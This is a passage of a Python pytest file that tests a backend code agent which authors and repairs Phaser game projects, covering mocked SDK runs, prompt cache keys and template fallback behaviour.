    # _files() 的 game.js 带 fetch()，先修掉再看引用错误更聚焦——直接断言引用错误在输出里即可
    out = s.run_checks()
    assert "shop.js is not referenced" in out


def test_author_enabled_requires_flag_and_real_model(monkeypatch):
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_AUTHOR_ENABLED", True)
    assert code_agent.author_enabled({"use_real": True})
    assert not code_agent.author_enabled({"use_real": False})
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_AUTHOR_ENABLED", False)
    assert not code_agent.author_enabled({"use_real": True})


def test_run_author_returns_none_for_empty_bundle():
    assert code_agent.run_author([], spec={}, design={}) is None


@pytest.mark.parametrize("detailed_enabled", [False, True])
def test_execute_agent_uses_responses_model(monkeypatch, detailed_enabled):
    from app.agents import author_runner

    agents_module = ModuleType("agents")
    exceptions_module = ModuleType("agents.exceptions")
    captured = {}

    class FakeAgent:
        def __init__(self, **kwargs):
            captured["agent"] = kwargs

    class FakeResponsesModel:
        def __init__(self, *, model, openai_client):
            captured["model"] = model
            captured["client"] = openai_client

    class FakeRunConfig:
        def __init__(self, **kwargs):
            captured["run_config"] = kwargs

    class FakeModelSettings:
        def __init__(self, **kwargs):
            captured["model_settings"] = kwargs

    class FakeApplyPatchResult:
        def __init__(self, *, status, output):
            self.status = status
            self.output = output

    class FakeApplyPatchTool:
        type = "apply_patch"

        def __init__(self, *, editor, needs_approval):
            self.editor = editor
            self.needs_approval = needs_approval

    class FakeStreamResult:
        def __init__(self):
            self.final_output = "FIXED: ok"
            self.context_wrapper = SimpleNamespace(
                usage=SimpleNamespace(
                    requests=1,
                    input_tokens=11,
                    output_tokens=7,
                    total_tokens=18,
                    input_tokens_details=SimpleNamespace(cached_tokens=0),
                )
            )

        async def stream_events(self):
            response = SimpleNamespace(id="resp-test")
            yield SimpleNamespace(
                type="raw_response_event",
                data=SimpleNamespace(
                    type="response.created", response=response, sequence_number=0
                ),
            )
            yield SimpleNamespace(
                type="raw_response_event",
                data=SimpleNamespace(
                    type="response.completed", response=response, sequence_number=1
                ),
            )

        def to_input_list(self):
            return []

    class FakeRunner:
        @staticmethod
        def run_streamed(agent, task_input, *, max_turns, run_config, hooks=None):
            captured["run"] = {
                "agent": agent,
                "task_input": task_input,
                "max_turns": max_turns,
                "run_config": run_config,
                "hooks": hooks,
            }
            return FakeStreamResult()

    def fake_function_tool(fn):
        return fn

    agents_module.Agent = FakeAgent
    agents_module.ApplyPatchResult = FakeApplyPatchResult
    agents_module.ApplyPatchTool = FakeApplyPatchTool
    agents_module.ModelSettings = FakeModelSettings
    agents_module.OpenAIResponsesModel = FakeResponsesModel
    agents_module.RunConfig = FakeRunConfig
    agents_module.Runner = FakeRunner
    agents_module.function_tool = fake_function_tool
    exceptions_module.AgentsException = RuntimeError
    exceptions_module.MaxTurnsExceeded = TimeoutError

    openai_module = ModuleType("openai")

    class FakeAsyncOpenAI:
        def __init__(self, **kwargs):
            captured["client_kwargs"] = kwargs

        async def close(self):
            captured["closed"] = True

    openai_module.AsyncOpenAI = FakeAsyncOpenAI
    monkeypatch.setitem(sys.modules, "agents", agents_module)
    monkeypatch.setitem(sys.modules, "agents.exceptions", exceptions_module)
    monkeypatch.setitem(sys.modules, "openai", openai_module)
    monkeypatch.setattr(code_agent, "available_skills", lambda: [])
    monkeypatch.setattr(code_agent.llm, "record_usage", lambda *args, **kwargs: None)
    monkeypatch.setattr(code_agent.settings, "CODE_AGENT_PROMPT_CACHE_KEY_PREFIX", "cache-test")
    trace_events = []

    class FakeRecorder:
        def record(self, event_type, payload, **kwargs):
            trace_events.append((event_type, payload, kwargs))
            return True

    recorder = FakeRecorder() if detailed_enabled else None
    trace_hooks = object()
    monkeypatch.setattr(
        author_runner.detailed_trace,
        "create_recorder",
        lambda **_kwargs: recorder,
    )
    monkeypatch.setattr(
        author_runner.detailed_trace,
        "build_run_hooks",
        lambda value: trace_hooks if value is not None else None,
    )

    from app.core.telemetry import bind_context

    bind_context(task_id=None)  # 无任务上下文 → cache key 后缀回退每跑唯一
    session = code_agent.RepairSession.from_files(_files())
    outcome = code_agent._execute_agent(
        session,
        agent_name="GameCodeRepair",
        instructions="repair",
        author_tools=False,
        task_input="input",
        turns_limit=5,
        workflow_name="test-workflow",
    )

    expected_model = code_agent.settings.CODE_AGENT_MODEL or code_agent.settings.MODEL_NAME
    assert outcome is not None
    assert captured["model"] == expected_model
    assert captured["agent"]["model"].__class__ is FakeResponsesModel
    assert captured["run"]["max_turns"] == 5
    assert captured["run_config"]["workflow_name"] == "test-workflow"
    assert captured["run_config"]["tracing_disabled"] is True
    assert captured["model_settings"]["parallel_tool_calls"] is False
    assert captured["run"]["hooks"] is (trace_hooks if detailed_enabled else None)
    assert [event[0] for event in trace_events] == (
        ["run_start", "llm_stream_event", "llm_stream_event", "run_end"]
        if detailed_enabled
        else []
    )
    cache_key = captured["model_settings"]["extra_args"]["prompt_cache_key"]
    # 前缀:工作流:任务级后缀 —— 此处未绑定 task_id,后缀回退每跑唯一随机 hex
    prefix, workflow, run_suffix = cache_key.split(":")
    assert (prefix, workflow) == ("cache-test", "test-workflow")
    assert len(run_suffix) == 12 and all(ch in "0123456789abcdef" for ch in run_suffix)
    assert captured["client_kwargs"]["base_url"] == code_agent.settings.OPENAI_BASE_URL
    assert captured["client_kwargs"]["max_retries"] == 0
    assert captured["closed"] is True


def test_prompt_cache_key_is_task_scoped(monkeypatch):
    from app.agents import author_runner
    from app.core.telemetry import bind_context

    monkeypatch.setattr(author_runner.settings, "CODE_AGENT_PROMPT_CACHE_KEY_PREFIX", "cache-test")
    bind_context(task_id="c166a81f-aa2d-4e55-9888-62093034a923")
    try:
        # 同任务多跑(作者→修复→修复、retry 续跑)共享同一 key,跨跑复用缓存前缀
        assert (
            author_runner._prompt_cache_key("wf")
            == author_runner._prompt_cache_key("wf")
            == "cache-test:wf:c166a81faa2d"
        )
        # workflow 段隔离不同 agent 家族
        assert author_runner._prompt_cache_key("other") == "cache-test:other:c166a81faa2d"
    finally:
        bind_context(task_id=None)
    # 无任务上下文回退每跑唯一
    assert author_runner._prompt_cache_key("wf") != author_runner._prompt_cache_key("wf")
    # 前缀为空(未启用)则不发 prompt_cache_key
    monkeypatch.setattr(author_runner.settings, "CODE_AGENT_PROMPT_CACHE_KEY_PREFIX", " ")
    assert author_runner._prompt_cache_key("wf") is None


def test_author_input_carries_spec_design_and_runtime():
    files = [{"path": "index.html", "content": "<html></html>"}]
    text = code_agent._build_author_input(files, {"title": "T"}, {"mode": "waves"}, "phaser", "2d")
    assert '"title": "T"' in text and '"mode": "waves"' in text
    assert "Phaser" in text and "index.html (13B)" in text


def test_generate_code_uses_author_agent(monkeypatch):
    from app.services.phaser_projects import create_modular_phaser_project

    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    project = create_modular_phaser_project({"title": "T"}, {}, {}, {})
    project.append(
        {
            "path": "src/systems/ShopSystem.ts",
            "content": "export class ShopSystem { credits = 0; }",
        }
    )
    outcome = code_agent.RepairOutcome(
        files=project,
        changed=["src/scenes/PlayScene.ts", "src/systems/ShopSystem.ts"],
        tokens=99,
        logs=["agent wrote src/systems/ShopSystem.ts"],
        note="DONE: core + shop",
        checks_ok=True,
        turns=6,
    )
    monkeypatch.setattr(nodes.code_agent, "run_author", lambda files, **kw: outcome)
    files, tokens, mode, agent_logs = nodes._generate_code({"use_real": True, "game_spec": {}, "game_design": {}})
    assert tokens == 99
    assert mode.startswith(f"project author ({len(project)} file(s), 6 turn(s)")
    assert any(f["path"] == "src/systems/ShopSystem.ts" for f in files)
    assert any("ShopSystem.ts" in line for line in agent_logs)


def test_generate_code_preserves_authored_project_for_outer_repair(monkeypatch):
    from app.services.phaser_projects import create_modular_phaser_project

    monkeypatch.setattr(nodes.settings, "REAL_MODEL_FALLBACK_ENABLED", False)
    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    project = create_modular_phaser_project({"title": "T"}, {}, {}, {})
    project.append(
        {
            "path": "src/systems/PathSystem.ts",
            "content": "export class PathSystem { broken = true; }",
        }
    )
    outcome = code_agent.RepairOutcome(
        files=project,
        changed=["src/systems/PathSystem.ts"],
        tokens=55,
        logs=["agent project checks: typecheck/build failed"],
        note="DONE: path system",
        checks_ok=False,
        turns=9,
    )
    monkeypatch.setattr(nodes.code_agent, "run_author", lambda files, **kw: outcome)

    files, tokens, mode, agent_logs = nodes._generate_code(
        {"use_real": True, "game_spec": {}, "game_design": {}}
    )

    assert files == project
    assert tokens == 55
    assert "outer build/repair pending" in mode
    assert any("preserving project" in line for line in agent_logs)


def test_generate_code_author_failure_stops_when_fallback_disabled(monkeypatch):
    monkeypatch.setattr(nodes.settings, "REAL_MODEL_FALLBACK_ENABLED", False)
    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    monkeypatch.setattr(nodes.code_agent, "run_author", lambda files, **kw: None)
    with pytest.raises(RuntimeError, match="GameProjectAuthor real model failed; fallback disabled"):
        nodes._generate_code({"use_real": True, "game_spec": {}, "game_design": {}})


def test_generate_code_author_can_fall_back_when_enabled(monkeypatch):
    monkeypatch.setattr(nodes.settings, "REAL_MODEL_FALLBACK_ENABLED", True)
    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    monkeypatch.setattr(nodes.code_agent, "run_author", lambda files, **kw: None)
    files, tokens, mode, agent_logs = nodes._generate_code({"use_real": True, "game_spec": {}, "game_design": {}})
    assert mode == "modular TypeScript template"
    assert tokens == 0
    assert any(f["path"] == "src/main.ts" for f in files)
    assert any("using modular TypeScript template" in line for line in agent_logs)


def test_generate_code_repair_path_skips_author(monkeypatch):
    monkeypatch.setattr(nodes.code_agent, "author_enabled", lambda state: True)
    called = {"author": False}
    monkeypatch.setattr(
        nodes.code_agent, "run_author", lambda files, **kw: called.__setitem__("author", True)
    )
    files, tokens, mode, agent_logs = nodes._generate_code(
        {"use_real": True, "game_spec": {}, "game_design": {}}, repair_error="boom"
    )
    assert not called["author"]  # 修复重生成不重跑作者循环
    assert mode == "modular TypeScript template"
    assert any(f["path"] == "src/main.ts" for f in files)
    assert any("stable modular template" in line for line in agent_logs)
